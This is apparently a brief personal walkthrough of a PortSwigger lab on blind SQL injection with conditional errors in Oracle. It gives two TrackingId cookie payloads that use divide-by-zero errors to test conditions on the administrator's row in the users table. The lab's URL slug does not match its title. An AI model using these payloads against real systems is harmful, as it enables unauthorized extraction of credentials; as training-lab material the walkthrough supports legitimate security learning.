# Lab: Blind SQL injection with conditional errors

## Url

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

## prob describe

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.

it is oracle database.

## solve

An error is received when the condition is true.

TrackingId of Cookie is set in the SQL query, so there is a SQL injection in TrackingId.

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' An error is received when the condition is true.
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' No error is received.
```

python script in Blind-SQL-with-cond-error.py.
